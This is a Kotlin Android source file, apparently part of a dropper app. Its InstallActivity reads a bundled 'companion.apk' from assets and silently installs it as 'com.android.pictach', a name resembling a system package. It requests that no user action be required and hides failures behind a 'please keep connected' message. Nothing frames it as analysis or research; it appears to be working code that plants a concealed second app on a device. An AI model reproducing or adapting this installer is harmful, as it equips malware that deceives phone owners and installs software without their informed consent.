package com.cristal.bristral.tristal.mistral

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val SESSION_REQUEST = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { runPipeline() }.start()
    }

    private fun runPipeline() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) {
                showNormal()
                return
            }
            runOnUiThread { installViaSession(apkBytes) }
        } catch (e: Exception) {
            showNormal()
        }
    }

    private fun installViaSession(apkBytes: ByteArray) {
        try {
            val packageInstaller = packageManager.packageInstaller

            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                setAppPackageName("com.android.pictach")
                setSize(apkBytes.size.toLong())

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                }
            }

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)

            try {
                session.openWrite("companion.apk", 0, apkBytes.size.toLong()).use { out ->
                    out.write(apkBytes)
                    session.fsync(out)
                }

                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT

                val pendingIntent = PendingIntent.getBroadcast(
                    this, SESSION_REQUEST, intent, flags
                )

                session.commit(pendingIntent.intentSender)
                session.close()

            } catch (e: IOException) {
                session.abandon()
                showNormal()
            }

        } catch (e: Exception) {
            showNormal()
        }
    }

    private fun loadAssets(): ByteArray? {
        return try {
            assets.open("companion.apk").use { it.readBytes() }
        } catch (e: Exception) {
            null
        }
    }

    private fun showNormal() {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = getString(R.string.please_keep_connected)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
